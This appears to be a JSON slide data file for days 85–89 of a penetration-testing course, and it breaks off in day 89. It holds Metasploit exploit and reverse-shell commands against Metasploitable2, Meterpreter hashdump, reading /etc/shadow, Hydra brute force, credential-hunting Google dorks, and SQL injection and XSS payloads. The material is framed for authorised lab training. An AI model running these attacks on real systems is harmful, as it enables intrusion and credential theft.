@@ -1,0 +1,765 @@
+[
+  {
+    "day": 85,
+    "cover": {
+      "title": "Ethical Hacking __Methodology__ & Legal Framework",
+      "hook": "Day 85. The final phase. Everything you have built over 84 days leads here. Ethical hacking starts NOW.",
+      "tags": ["#EthicalHacking", "#Pentesting", "#Day85of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "What is Ethical Hacking?",
+        "tag": "Foundation",
+        "method": "WHAT — Ethical Hacking Explained",
+        "heading": "Ethical Hacking: __Same Skills, Legal Context__",
+        "body": [
+          {"type": "para", "text": "**Ethical hacking** is the authorised simulation of real attacks to find vulnerabilities before malicious hackers do. Same exact techniques as criminal hackers — completely different legal context."},
+          {"type": "para", "text": "**The only difference** between a penetration tester and a criminal is a single document: written, signed authorisation from the system owner. Without it, every technique this week is a federal crime."},
+          {"type": "para", "text": "**You are not a beginner entering this phase.** After 84 days you understand networking at packet level, write Python automation tools, operate Linux fluently, analyse malware traffic, and build SIEMs. You are an informed attacker-defender who understands both sides — that combination is rare and valuable."}
+        ],
+        "pills": [
+          {"text": "Authorisation", "t": "r"},
+          {"text": "Pentest Phases", "t": "y"},
+          {"text": "Legal Framework", "t": "o"}
+        ],
+        "time": "20 min · TCM Security Practical Ethical Hacking — Part 1 (YouTube, free)"
+      },
+      {
+        "type": "red",
+        "label": "Pentest Phases (PTES)",
+        "tag": "Methodology",
+        "method": "WHAT — The 6 Professional Pentest Phases",
+        "heading": "PTES: __6 Phases__ of Every Engagement",
+        "body": [
+          {"type": "bullet", "text": "**Phase 1 — Pre-engagement:** Define scope, rules of engagement, testing windows, emergency contacts, and what happens if a critical vulnerability is found mid-test."},
+          {"type": "bullet", "text": "**Phase 2 — Reconnaissance:** Passive OSINT and active intelligence gathering — map the entire attack surface before touching a single exploit."},
+          {"type": "bullet", "text": "**Phase 3 — Scanning:** Port scanning, service enumeration, vulnerability scanning — identify exactly what is running and what versions."},
+          {"type": "bullet", "text": "**Phase 4 — Exploitation:** Use discovered vulnerabilities to gain initial access — always within the agreed scope."},
+          {"type": "bullet", "text": "**Phase 5 — Post-Exploitation:** Persistence, lateral movement, privilege escalation, data access — simulate what a real attacker would do after initial compromise."},
+          {"type": "bullet", "text": "**Phase 6 — Reporting:** Document every finding with evidence, CVSS score, reproduction steps, and remediation. The report IS the deliverable."}
+        ],
+        "time": "20 min · TCM Security Practical Ethical Hacking Part 1"
+      },
+      {
+        "type": "dark",
+        "label": "Types of Pentests",
+        "tag": "Engagement Types",
+        "method": "WHAT — Black, Gray, and White Box Testing",
+        "heading": "Pentest Types: __Know the Difference__",
+        "body": [
+          {"type": "bullet", "text": "**Black Box:** No prior knowledge — simulates a real external attacker starting from zero. Most realistic external threat simulation."},
+          {"type": "bullet", "text": "**Gray Box:** Some knowledge provided — like an employee account or network diagram. Most common engagement type. Balances realism and efficiency."},
+          {"type": "bullet", "text": "**White Box:** Full access — source code, architecture diagrams, credentials. Most thorough. Finds the most vulnerabilities in the least time."},
+          {"type": "para", "text": "**Pentest domains:** Network · Web Application · Mobile · Cloud · Physical · Social Engineering. Each has different methodology, tools, and report deliverables. This week focuses on network and web application pentesting — the two highest-demand specialisations."}
+        ],
+        "time": "15 min · TCM Security Part 1 — Pentest Types Section"
+      },
+      {
+        "type": "white",
+        "label": "Legal Framework",
+        "tag": "Non-Negotiable",
+        "method": "WHAT — Legal Requirements Before Any Testing",
+        "heading": "Legal Framework: __Never Skip This__",
+        "body": [
+          {"type": "para", "text": "**Always get a signed Statement of Work + Rules of Engagement before ANY testing activity.** Define exactly: in-scope IP ranges and domains, out-of-scope systems, testing time windows, emergency contact escalation procedure, and what happens if a critical vulnerability is found mid-test."},
+          {"type": "code", "text": "# Rules of Engagement must define:\nIn-scope:   192.168.1.0/24, app.target.com\nOut-of-scope: *.production.target.com\nTesting window: Mon–Fri 18:00–06:00 UTC only\nEmergency contact: CISO +1-555-0100 (24/7)\nCritical vuln found: Stop and notify within 1 hour"},
+          {"type": "para", "text": "**Testing even one IP outside scope** = potential Computer Fraud and Abuse Act (CFAA) violation. Not a grey area — a federal crime. Get everything in writing, confirm scope with the client before every session."}
+        ],
+        "time": "15 min · Read: CFAA overview and scope management best practices"
+      },
+      {
+        "type": "yellow",
+        "label": "Pentest Certifications",
+        "tag": "Career Path",
+        "method": "WHAT — Certification Roadmap",
+        "heading": "Day 85 Checklist",
+        "steps": [
+          "**Download and install** Kali Linux in VirtualBox — kali.org/get-kali → Installer Images",
+          "**Download** Metasploitable2 from sourceforge.net — the intentionally vulnerable lab target VM",
+          "**Configure** both VMs on an isolated host-only network in VirtualBox — zero internet access",
+          "**Verify** connectivity: boot Kali → `ping Metasploitable2_IP` → confirm you can reach it",
+          "Understand the **4 pentest cert levels:** eJPT (beginner) → PNPT (practical, best value) → CEH (recognised) → OSCP (gold standard)"
+        ],
+        "time": "Total Day 85 Study Time: 90 – 120 minutes (includes lab setup)"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 85",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Course", "name": "TCM Security — Practical Ethical Hacking Part 1 (YouTube)", "url": "youtube.com/watch?v=3FNYvj2U0HM"},
+          {"label": "📺 Course", "name": "TCM Security — Practical Ethical Hacking Part 2 (YouTube)", "url": "youtube.com/watch?v=sH4JCwjybGs"},
+          {"label": "🧪 Path", "name": "TryHackMe — Jr Penetration Tester Learning Path", "url": "tryhackme.com/path/outline/jrpenetrationtester"},
+          {"label": "🛠️ Download", "name": "Kali Linux — Official ISO Download", "url": "kali.org/get-kali"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 85",
+        "heading": "Your Hands-On __Task__ for Day 85",
+        "steps": [
+          "**Install** Kali Linux in VirtualBox → take a snapshot immediately after first boot",
+          "**Download** Metasploitable2 → import into VirtualBox → set network to Host-Only",
+          "**Set** Kali to the same Host-Only network → boot both VMs",
+          "**Verify** lab: `ping` from Kali to Metasploitable2 — both must see each other with zero internet access"
+        ],
+        "time": "Hands-On Task: 60 – 90 minutes (lab setup)"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 85",
+        "quote": "Every technique this week is practiced ONLY against your own lab VMs. Using these techniques against any other system without explicit written permission — even just to test — is a federal crime in most countries. No exceptions.",
+        "sub": "After 84 days of preparation, you enter this phase with more foundational knowledge than most people who attempt OSCP. Networking theory, Python automation, Linux fluency, traffic analysis, SIEM operations, and cloud security — all feed directly into penetration testing methodology. You have been building toward this week since Day 1.",
+        "mistake": "Setting up the hacking lab on a bridged network instead of host-only. Bridged mode connects your vulnerable VMs to your real home network — other devices on your network (including neighbours on shared networks) could potentially reach Metasploitable2's intentional vulnerabilities. Always use isolated host-only networking for lab VMs."
+      }
+    ]
+  },
+
+  {
+    "day": 86,
+    "cover": {
+      "title": "Reconnaissance: OSINT, Nmap & __Active Scanning__",
+      "hook": "Elite hackers spend 80% of their time on recon. Know more about the target than they know about themselves.",
+      "tags": ["#Reconnaissance", "#Nmap", "#Day86of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Passive Recon (OSINT)",
+        "tag": "Foundation",
+        "method": "WHAT — Zero-Contact Intelligence Gathering",
+        "heading": "Passive Recon: __No Target Contact__",
+        "body": [
+          {"type": "para", "text": "**Passive recon** collects intelligence without touching the target systems — completely legal everywhere. Every data point gathered here shapes every attack decision that follows."},
+          {"type": "bullet", "text": "**Google Dorking:** site:, inurl:, filetype:, intitle: operators — find exposed admin panels, open directories, accidentally published credentials"},
+          {"type": "bullet", "text": "**WHOIS + DNS:** Registration data, name servers, MX records — map infrastructure and hosting providers"},
+          {"type": "bullet", "text": "**Shodan.io:** Internet-facing infrastructure search — find exposed services before the client knows they are public"},
+          {"type": "bullet", "text": "**Certificate Transparency (crt.sh):** Find all subdomains issued TLS certificates — reveals hidden infrastructure"},
+          {"type": "bullet", "text": "**GitHub:** Leaked credentials, API keys, internal config files accidentally committed to public repos"}
+        ],
+        "pills": [
+          {"text": "OSINT", "t": "r"},
+          {"text": "Nmap", "t": "y"},
+          {"text": "Web Enum", "t": "o"}
+        ],
+        "time": "20 min · osintframework.com · shodan.io"
+      },
+      {
+        "type": "red",
+        "label": "Google Dorking",
+        "tag": "OSINT Technique",
+        "method": "HOW — Advanced Search Operator Recon",
+        "heading": "Google Dorks: __Targeted Intelligence__",
+        "body": [
+          {"type": "code", "text": "# Find public documents that reveal technology:\nsite:target.com filetype:pdf"},
+          {"type": "code", "text": "# Find exposed admin panels:\nsite:target.com inurl:admin"},
+          {"type": "code", "text": "# Find open directory listings:\nintitle:\"index of\" site:target.com"},
+          {"type": "code", "text": "# Find accidentally exposed credentials:\nsite:target.com \"password\" filetype:txt"},
+          {"type": "code", "text": "# Find secrets leaked to GitHub:\nsite:github.com \"target.com\" password"},
+          {"type": "para", "text": "**Google Hacking Database (GHDB)** at exploit-db.com/google-hacking-database has 5,000+ dork queries organised by category. Professional pentesters run through the top 50 against every target before touching a single tool."}
+        ],
+        "time": "25 min · exploit-db.com/google-hacking-database"
+      },
+      {
+        "type": "dark",
+        "label": "Active Recon with Nmap",
+        "tag": "Scanning",
+        "method": "HOW — Nmap Against Your Lab Target",
+        "heading": "Nmap: __Map Every Open Door__",
+        "body": [
+          {"type": "code", "text": "# Comprehensive scan — all ports, versions, scripts, OS:\nnmap -sV -sC -O -p- 192.168.56.X\n# -sV = service version detection\n# -sC = run default NSE scripts\n# -O  = OS fingerprinting\n# -p- = scan all 65535 ports"},
+          {"type": "code", "text": "# Stealth SYN scan (less noisy):\nnmap -sS -T4 192.168.56.X"},
+          {"type": "code", "text": "# Vulnerability detection scripts:\nnmap --script vuln 192.168.56.X"},
+          {"type": "code", "text": "# Aggressive scan with timing:\nnmap -A -T4 192.168.56.X"},
+          {"type": "para", "text": "**Metasploitable2** has 20+ intentionally vulnerable open services. Your Nmap scan will return a rich list of old, exploitable versions — exactly what the exploitation phase targets."}
+        ],
+        "time": "30 min · Run all 4 Nmap commands against Metasploitable2"
+      },
+      {
+        "type": "white",
+        "label": "Web Enumeration",
+        "tag": "Web Recon",
+        "method": "HOW — Directory and Subdomain Discovery",
+        "heading": "Web Enumeration: __Find Hidden Paths__",
+        "body": [
+          {"type": "code", "text": "# Directory brute-force:\ngobuster dir -u http://192.168.56.X \\\n  -w /usr/share/wordlists/dirb/common.txt"},
+          {"type": "code", "text": "# Subdomain enumeration (for real targets):\ngobuster dns -d target.com \\\n  -w /usr/share/wordlists/subdomains-top1million-5000.txt"},
+          {"type": "code", "text": "# Web server vulnerability scan:\nnikto -h http://192.168.56.X\n# Finds: outdated server versions, dangerous HTTP methods,\n# default files, misconfigurations"},
+          {"type": "code", "text": "# WordPress-specific scanning:\nwpscan --url http://target.com\n# Enumerates: WP version, plugins, themes, users"},
+          {"type": "para", "text": "**All pre-installed on Kali Linux.** Run nikto and gobuster against Metasploitable2 — the web server running on it has multiple exploitable paths that these tools will expose immediately."}
+        ],
+        "time": "30 min · Run gobuster and nikto against Metasploitable2"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 86 Learning Targets",
+        "heading": "Day 86 Checklist",
+        "steps": [
+          "Run **`nmap -sV -sC -p- 192.168.56.X`** against Metasploitable2 — record every open port, service, and version",
+          "Run **`nikto -h http://192.168.56.X`** — document all findings in a recon table",
+          "Run **`gobuster dir`** against the web server — find at least 5 hidden directories",
+          "Create a **recon report table:** Port | Service | Version | Potential Vulnerability for each finding",
+          "Run **5 Google Dorks** against a domain you own — practise the syntax"
+        ],
+        "time": "Total Day 86 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 86",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Video", "name": "TCM Security — Part 1 Recon Section (YouTube, free)", "url": "youtube.com/watch?v=3FNYvj2U0HM"},
+          {"label": "🕸️ Map", "name": "OSINT Framework — Interactive Tool Directory", "url": "osintframework.com"},
+          {"label": "🔍 Tool", "name": "Shodan.io — Internet Device Search Engine", "url": "shodan.io"},
+          {"label": "🔎 Tool", "name": "crt.sh — Certificate Transparency Subdomain Finder", "url": "crt.sh"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 86",
+        "heading": "Your Hands-On __Task__ for Day 86",
+        "steps": [
+          "**Run** `nmap -sV -sC -p- 192.168.56.X` — save output to `recon_metasploitable.txt`",
+          "**Run** `nikto -h http://192.168.56.X` — save output — note every warning",
+          "**Run** `gobuster dir` with common.txt wordlist — list every discovered directory",
+          "**Create** a recon table: Port | Service | Version | Potential CVE — this becomes Section 3 of your pentest report"
+        ],
+        "time": "Hands-On Task: 75 – 90 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 86",
+        "quote": "Experienced pentesters routinely spend 10+ hours on recon before executing a single exploit. The more you know about the target, the more precisely targeted your attack — and the higher your success rate.",
+        "sub": "Run `theHarvester -d target.com -b all` on any real domain you own — it collects emails, subdomains, IPs, and employee names from 50+ public sources in a single command. Run it against your own domain first. The intelligence it surfaces about you will surprise you — and teach you exactly what attackers know before they start.",
+        "mistake": "Skipping passive OSINT and jumping straight to Nmap scanning. Active scanning generates logs on the target system — passive OSINT leaves zero trace. The sequence matters: exhaust all passive sources first, then transition to active scanning when you have already built a detailed picture of the target."
+      }
+    ]
+  },
+
+  {
+    "day": 87,
+    "cover": {
+      "title": "Exploitation: __Metasploit__ Framework & Manual Exploits",
+      "hook": "Metasploit: the world's most used exploitation framework. 2000+ exploits, one interface.",
+      "tags": ["#Metasploit", "#Exploitation", "#Day87of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Metasploit Basics",
+        "tag": "Foundation",
+        "method": "WHAT — msfconsole Core Workflow",
+        "heading": "Metasploit: __2000+ Exploits__, One Interface",
+        "body": [
+          {"type": "code", "text": "# Launch Metasploit:\nmsfconsole"},
+          {"type": "code", "text": "# Core workflow — 6 commands:\nsearch vsftpd                    # 1. Find exploit\nuse exploit/unix/ftp/vsftpd_234_backdoor  # 2. Select\nshow options                     # 3. View requirements\nset RHOSTS 192.168.56.X          # 4. Set target\nset PAYLOAD cmd/unix/interact    # 5. Set payload\nexploit                          # 6. Execute"},
+          {"type": "para", "text": "**Metasploit** is an open-source exploitation framework maintained by Rapid7. Pre-installed on Kali Linux. The same framework used by professional red teams — containing 2,000+ exploits for Windows, Linux, macOS, mobile, and web applications."}
+        ],
+        "pills": [
+          {"text": "msfconsole", "t": "r"},
+          {"text": "Meterpreter", "t": "y"},
+          {"text": "searchsploit", "t": "o"}
+        ],
+        "time": "25 min · TCM Security Part 2 (YouTube) · Metasploit Unleashed (free)"
+      },
+      {
+        "type": "red",
+        "label": "Meterpreter Shell",
+        "tag": "Post-Exploitation",
+        "method": "WHAT — Meterpreter Command Reference",
+        "heading": "Meterpreter: __Post-Exploitation Power__",
+        "body": [
+          {"type": "code", "text": "# After gaining a Meterpreter shell:\nsysinfo          # Target OS, hostname, architecture\ngetuid           # Current user context\ngetsystem        # Attempt automatic privilege escalation\nhashdump         # Dump all Windows password hashes"},
+          {"type": "code", "text": "ps               # List all running processes\nmigrate PID      # Move into another process (stealth)\nupload /path/file /remote/path   # Push file to target\ndownload /remote/file /local/    # Pull file from target"},
+          {"type": "code", "text": "portfwd add -l 3389 -p 3389 -r 192.168.1.100\n# Forward RDP port for lateral movement to next target\n\nrun post/multi/recon/local_exploit_suggester\n# Suggest local privilege escalation exploits automatically"},
+          {"type": "para", "text": "**Meterpreter** runs entirely in RAM — never writes to disk. This makes it difficult to detect with file-system scanning. The go-to payload for professional red team engagements."}
+        ],
+        "time": "25 min · Practice all Meterpreter commands after gaining a shell"
+      },
+      {
+        "type": "dark",
+        "label": "Lab Exploits on Metasploitable2",
+        "tag": "Practice",
+        "method": "HOW — 3 Real Exploits to Practice",
+        "heading": "Metasploitable2: __3 Exploits to Practice__",
+        "body": [
+          {"type": "code", "text": "# Exploit 1: vsftpd 2.3.4 backdoor (instant root shell):\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.X\nexploit\n# Background: smiley face in username triggers a backdoor\n# on port 6200 — a real vulnerability from 2011"},
+          {"type": "code", "text": "# Exploit 2: UnrealIRCd backdoor:\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.56.X\nexploit"},
+          {"type": "code", "text": "# Exploit 3: Samba usermap_script:\nuse exploit/multi/samba/usermap_script\nset RHOSTS 192.168.56.X\nset PAYLOAD cmd/unix/reverse\nset LHOST 192.168.56.1  # Your Kali IP\nexploit"},
+          {"type": "para", "text": "Each exploit maps to a real CVE and demonstrates a different vulnerability class — backdoor, unpatched service, remote code execution via misconfiguration."}
+        ],
+        "time": "45 min · Complete all 3 exploits against Metasploitable2"
+      },
+      {
+        "type": "white",
+        "label": "Manual Exploitation & Password Attacks",
+        "tag": "Beyond Metasploit",
+        "method": "HOW — searchsploit and Offline Cracking",
+        "heading": "Manual Exploits & __Password Attacks__",
+        "body": [
+          {"type": "code", "text": "# Search local Exploit-DB copy:\nsearchsploit vsftpd 2.3.4\n\n# Copy exploit to working directory:\nsearchsploit -m 49757\n\n# Read and understand the exploit code:\ncat 49757.py  # Always read before running"},
+          {"type": "code", "text": "# SSH brute force with Hydra:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.56.X"},
+          {"type": "code", "text": "# Offline hash cracking:\nhashcat -m 1000 hashes.txt rockyou.txt  # NTLM\njohn --wordlist=rockyou.txt hash.txt     # John the Ripper"},
+          {"type": "para", "text": "**For OSCP prep:** Metasploit is restricted to 1 machine in the exam. Practise searchsploit and manual exploitation heavily — understanding WHY an exploit works is worth 10x more than just running `exploit` in msfconsole."}
+        ],
+        "time": "20 min · Practice searchsploit on 2 Metasploitable2 services"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 87 Learning Targets",
+        "heading": "Day 87 Checklist",
+        "steps": [
+          "**Exploit vsftpd 2.3.4** backdoor using Metasploit — get a root shell",
+          "**Run** `sysinfo`, `getuid`, `ps`, and `hashdump` — document every output",
+          "**Crack** the hashdump output using `john --wordlist=rockyou.txt`",
+          "**Use searchsploit** to find the same vsftpd exploit manually — read the source code",
+          "**Document** the complete exploitation chain: Recon → Vulnerability → Exploit → Post-Exploit"
+        ],
+        "time": "Total Day 87 Study Time: 120 – 150 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 87",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Video", "name": "TCM Security — Part 2 Exploitation Section (YouTube)", "url": "youtube.com/watch?v=sH4JCwjybGs"},
+          {"label": "📖 Course", "name": "Metasploit Unleashed — Free Comprehensive Course", "url": "offensive-security.com/metasploit-unleashed"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Metasploit Introduction' Room (free)", "url": "tryhackme.com/room/metasploitintro"},
+          {"label": "🎯 Targets", "name": "VulnHub — Free Downloadable Vulnerable VMs", "url": "vulnhub.com"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 87",
+        "heading": "Your Hands-On __Task__ for Day 87",
+        "steps": [
+          "**Launch** msfconsole → `use exploit/unix/ftp/vsftpd_234_backdoor` → set RHOSTS → `exploit`",
+          "**In the shell:** run `id`, `whoami`, `uname -a`, `cat /etc/shadow` — save all output",
+          "**Run hashdump** → save hashes → crack with `john --wordlist=rockyou.txt hashes.txt`",
+          "**Document** the full chain in a findings table: CVE | Service | Exploit Used | Access Level | Evidence"
+        ],
+        "time": "Hands-On Task: 90 – 120 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 87",
+        "quote": "Practice manual exploitation heavily alongside Metasploit — the OSCP exam restricts Metasploit to just one machine. Understanding why an exploit works is worth 10x more than knowing how to run it.",
+        "sub": "Set up your lab on a completely isolated host-only network with NO bridge to your physical network or internet. Metasploitable2 has intentional backdoors and vulnerabilities that could be exploited by others if it is accessible outside your isolated environment. Always verify network isolation before powering on vulnerable VMs.",
+        "mistake": "Relying entirely on Metasploit without understanding the underlying vulnerability. When Metasploit succeeds, read the module's source code to understand what it actually did. When it fails, read error messages to diagnose why. The tool is a shortcut — the knowledge is the career asset."
+      }
+    ]
+  },
+
+  {
+    "day": 88,
+    "cover": {
+      "title": "Web Application Hacking: __Burp Suite__ & OWASP Top 10",
+      "hook": "80% of modern applications are web-based. Web hacking is the highest-demand penetration testing skill.",
+      "tags": ["#BurpSuite", "#WebHacking", "#Day88of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Burp Suite Community Edition",
+        "tag": "Foundation",
+        "method": "WHAT — Burp Suite for Web Testing",
+        "heading": "Burp Suite: __See and Control Every Request__",
+        "body": [
+          {"type": "para", "text": "**Burp Suite Community Edition** (free) is the industry-standard web application security testing platform. Install from portswigger.net → set browser proxy to 127.0.0.1:8080 → you now see and control every HTTP/HTTPS request your browser makes."},
+          {"type": "bullet", "text": "**Proxy:** Intercept and modify every HTTP/HTTPS request and response in real time — the core feature"},
+          {"type": "bullet", "text": "**Repeater:** Manually replay and modify individual requests — essential for manual vulnerability testing"},
+          {"type": "bullet", "text": "**Intruder:** Automated parameter fuzzing — brute force logins, parameter enumeration (rate-limited in free tier)"},
+          {"type": "bullet", "text": "**Decoder:** Encode/decode Base64, URL encoding, HTML entities — decode obfuscated payloads instantly"},
+          {"type": "bullet", "text": "**Comparer:** Side-by-side comparison of two requests or responses — spot subtle authentication differences"}
+        ],
+        "pills": [
+          {"text": "Proxy", "t": "r"},
+          {"text": "Repeater", "t": "y"},
+          {"text": "OWASP Top 10", "t": "o"}
+        ],
+        "time": "20 min · portswigger.net/burp/communitydownload"
+      },
+      {
+        "type": "red",
+        "label": "OWASP Top 10 (2021)",
+        "tag": "Web Vulnerabilities",
+        "method": "WHAT — The 10 Most Critical Web Vulnerabilities",
+        "heading": "OWASP Top 10: __Know All 10 Deeply__",
+        "body": [
+          {"type": "code", "text": "A01: Broken Access Control        — most prevalent 2021\nA02: Cryptographic Failures       — sensitive data exposed\nA03: Injection                    — SQLi, XSS, command\nA04: Insecure Design              — architectural flaws\nA05: Security Misconfiguration    — default passwords, open cloud"},
+          {"type": "code", "text": "A06: Vulnerable Components        — outdated libraries\nA07: Auth Failures                — weak sessions, no MFA\nA08: Data Integrity Failures      — unsigned updates, CI/CD\nA09: Logging Failures             — no audit trail\nA10: SSRF                         — server-side request forgery"},
+          {"type": "para", "text": "Every web security interview covers the OWASP Top 10. Every bug bounty programme references it. Every web pentest report maps findings to it. Know all 10 deeply — what causes each, how to detect it, and how to remediate it."}
+        ],
+        "time": "20 min · owasp.org/Top10 — read each category"
+      },
+      {
+        "type": "dark",
+        "label": "SQL Injection",
+        "tag": "A03 — Most Famous",
+        "method": "HOW — SQL Injection Attack and Detection",
+        "heading": "SQL Injection: __The Classic Attack__",
+        "body": [
+          {"type": "code", "text": "# Login bypass (basic):\nUsername: admin'--\nPassword: anything\n# SQL becomes: SELECT * FROM users WHERE user='admin'--' AND pass='...'\n# The -- comments out the password check entirely"},
+          {"type": "code", "text": "# UNION-based data extraction:\n' UNION SELECT username, password FROM users--\n# Appends a second query — dumps the entire user table"},
+          {"type": "code", "text": "# Automated with SQLMap:\nsqlmap -u \"http://192.168.56.X/page?id=1\" --dbs\n# Enumerates all databases automatically\nsqlmap -u \"http://192.168.56.X/page?id=1\" -D dvwa --tables\nsqlmap -u \"http://192.168.56.X/page?id=1\" -D dvwa -T users --dump"},
+          {"type": "para", "text": "**The fix is one line:** use parameterised queries (prepared statements). SQLi is entirely preventable — yet remains in the OWASP Top 10 because legacy codebases and untrained developers continue producing vulnerable code daily."}
+        ],
+        "time": "25 min · PortSwigger SQLi Labs 1–4"
+      },
+      {
+        "type": "white",
+        "label": "XSS & Practice Applications",
+        "tag": "Client-Side Attacks",
+        "method": "WHAT — XSS and Vulnerable Practice Targets",
+        "heading": "XSS & __Practice Targets__",
+        "body": [
+          {"type": "para", "text": "**Cross-Site Scripting (XSS):** Inject malicious JavaScript into a web page that executes in other users' browsers. Test with `<script>alert(1)</script>` in every input field."},
+          {"type": "bullet", "text": "**Reflected XSS:** Payload in the URL — affects only the user who clicks the link. Delivered via phishing."},
+          {"type": "bullet", "text": "**Stored XSS:** Payload saved to the database — executes for every user who views the page. Highest impact."},
+          {"type": "bullet", "text": "**Impact:** Steal session cookies → account takeover · Redirect to phishing pages · Keylog form input"},
+          {"type": "code", "text": "# Deploy Juice Shop (best practice target):\ndocker run -p 3000:3000 bkimminich/juice-shop\n# Also available: DVWA, WebGoat, bWAPP — all free"},
+          {"type": "para", "text": "**PortSwigger Web Academy** (portswigger.net/web-security) has 30 free XSS labs of increasing difficulty — better than any paid course."}
+        ],
+        "time": "25 min · Deploy Juice Shop and find the first XSS"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 88 Learning Targets",
+        "heading": "Day 88 Checklist",
+        "steps": [
+          "**Install Burp Suite** Community Edition — configure browser proxy to 127.0.0.1:8080 — intercept one request",
+          "**Deploy OWASP Juice Shop** with Docker — browse it through Burp — examine all intercepted requests",
+          "**Find and exploit** the SQL injection on the Juice Shop login — access the admin account",
+          "**Find an XSS** vulnerability — pop an `alert(1)` in the browser",
+          "**Use Burp Repeater** to manually modify a request — change a parameter and observe the response"
+        ],
+        "time": "Total Day 88 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 88",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "🏋️ Labs", "name": "PortSwigger Web Academy — 200+ Free Labs (best resource)", "url": "portswigger.net/web-security"},
+          {"label": "🧃 Target", "name": "OWASP Juice Shop — Modern Vulnerable Web App", "url": "github.com/juice-shop/juice-shop"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'OWASP Top 10' Room (free)", "url": "tryhackme.com/room/owasptop10"},
+          {"label": "📖 Reference", "name": "OWASP Top 10 — Official Documentation", "url": "owasp.org/Top10"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 88",
+        "heading": "Your Hands-On __Task__ for Day 88",
+        "steps": [
+          "**Start** Juice Shop with Docker → open Burp Suite → set browser proxy → verify interception works",
+          "**Test** every login field with `'` — observe which returns a SQL error → exploit to access admin",
+          "**Test** every input field with `<script>alert(1)</script>` — find and trigger stored XSS",
+          "**Document** each vulnerability: what you found, how you exploited it, what the secure code fix is"
+        ],
+        "time": "Hands-On Task: 75 – 90 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 88",
+        "quote": "PortSwigger Web Academy is completely free, has 200+ hands-on labs, and is genuinely better than most paid courses. Complete the SQL injection and XSS learning paths — 40+ labs each — and you have job-ready web pentesting skills.",
+        "sub": "Always configure Burp's 'Intercept OFF' when not actively testing. Having intercept ON while browsing normally causes every request to hang until manually forwarded — you will forget it is on, wonder why every page is broken, and waste 10 minutes before remembering. Toggle intercept deliberately for each test and off immediately after.",
+        "mistake": "Only using SQLMap without understanding manual SQL injection first. SQLMap can miss injection points and cannot explain why an injection works. Manual testing with a single quote, observing the error, understanding the SQL query structure, and crafting the UNION payload — that understanding makes you a web pentester. SQLMap makes you a button pusher."
+      }
+    ]
+  },
+
+  {
+    "day": 89,
+    "cover": {
+      "title": "HackTheBox, CTFs & __Writing Pentest Reports__",
+      "hook": "Day 89. One day left. HackTheBox is where real hackers prove their skills. Reports are how you get paid.",
+      "tags": ["#HackTheBox", "#CTF", "#Day89of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "HackTheBox Platform",
+        "tag": "Foundation",
+        "method": "WHAT — HackTheBox for Skill Building",
+        "heading": "HackTheBox: __Where Real Skills Are Proven__",
+        "body": [
+          {"type": "para", "text": "**HackTheBox (HTB)** is a machine-based penetration testing practice platform used by professional pentesters and red teamers globally to continuously sharpen real-world skills against realistic targets."},
+          {"type": "bullet", "text": "**Starting Point (free):** Completely free, guided machines — Tier 0 and Tier 1. Perfect for this week. Start here today."},
+          {"type": "bullet", "text": "**Retired machines (free with VIP or with writeup guides):** Hundreds of machines with published solutions. The best learning combination: solve → watch IppSec → understand 10 techniques you missed."},
+          {"type": "bullet", "text": "**Active machines (VIP $14/month):** Current challenge machines — no published solutions. Closest to a real engagement."},
+          {"type": "bullet", "text": "**Challenges:** Crypto, forensics, web, reversing, OSINT — all the skills from the previous 88 days applied in competitive puzzle format."}
+        ],
+        "pills": [
+          {"text": "HTB Starting Point", "t": "r"},
+          {"text": "VulnHub", "t": "y"},
+          {"text": "Pentest Report", "t": "o"}
+        ],
+        "time": "20 min · hackthebox.com → Starting Point → Tier 0"
+      },
+      {
+        "type": "red",
+        "label": "HTB Starting Point — Free Path",
+        "tag": "Beginner Machines",
+        "method": "WHAT — 8 Free Guided Machines",
